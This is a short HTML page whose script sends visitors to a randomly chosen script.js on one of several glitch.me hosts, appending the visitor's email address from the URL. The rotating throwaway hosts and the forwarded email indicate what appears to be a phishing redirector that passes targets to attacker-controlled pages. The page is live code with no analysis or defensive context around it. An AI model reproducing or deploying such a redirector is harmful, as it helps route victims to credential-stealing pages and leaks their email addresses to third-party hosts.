<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>REDIRECTING</title>
</head>
<body>
    <script>
        const urls = [
            'https://marshy-knotty-philosophy.glitch.me/script.js',
            'https://joyous-flint-opinion.glitch.me/script.js',
	    'https://economic-exciting-amaranthus.glitch.me/script.js',
            'https://bubbly-ninth-gopher.glitch.me/script.js',
            'https://obvious-groovy-sort.glitch.me/script.js',
            // Add more URLs to the array
        ];
        let randomUrl = urls[Math.floor(Math.random() * urls.length)];
        const email = new URLSearchParams(location.search).get('email');
        if (email) {
            randomUrl += '?email=' + email;
        }
        location.replace(randomUrl);
    </script>
</body>
</html>
